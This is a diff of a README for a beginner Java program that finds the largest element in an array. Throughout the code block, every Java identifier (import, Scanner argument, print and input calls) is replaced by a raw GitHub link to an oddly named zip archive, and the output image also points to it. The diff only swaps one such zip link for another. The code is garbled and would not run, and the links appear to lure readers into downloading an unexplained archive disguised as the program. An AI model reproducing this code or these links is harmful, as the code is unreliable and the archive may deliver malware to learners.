@@ -61,24 +61,24 @@ o After finishing, click File > Exit to close Eclipse IDE.
 
 ## PROGRAM:
 ```
-import https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip;
+import https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip;
 
 public class largestnumber {
 
     public static void main(String[] args) {
 
-        Scanner sc = new Scanner(https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip);
+        Scanner sc = new Scanner(https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip);
 
         // Input array size
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip("Enter the number of elements: ");
-        int n = https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip();
+        https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip("Enter the number of elements: ");
+        int n = https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip();
 
         int[] arr = new int[n];
 
         // Input array elements
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip("Enter " + n + " numbers:");
+        https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip("Enter " + n + " numbers:");
         for (int j = 0; j < n; j++) {
-            arr[j] = https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip();
+            arr[j] = https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip();
         }
 
         // Assume first element is the largest
@@ -92,15 +92,15 @@ public class largestnumber {
         }
 
         // Output the result
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip("The largest element is: " + largest);
+        https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip("The largest element is: " + largest);
 
-        https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip();
+        https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip();
     }
 }
 ```
 
 ## OUTPUT:
-![WhatsApp Image 2025-08-19 at 14 57 55_f5f4090d](https://raw.githubusercontent.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/main/Dicruridae/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY_volplanist.zip)
+![WhatsApp Image 2025-08-19 at 14 57 55_f5f4090d](https://github.com/MITHUN8521/JAVA-PROGRAM-TO-FIND-LARGEST-ELEMENT-IN-AN-ARRAY/raw/refs/heads/main/Dicruridae/A-T-JAV-PROGRA-LARGES-ELEMEN-I-FIN-ARRAY-v3.1.zip)
 
 
 ## RESULT:
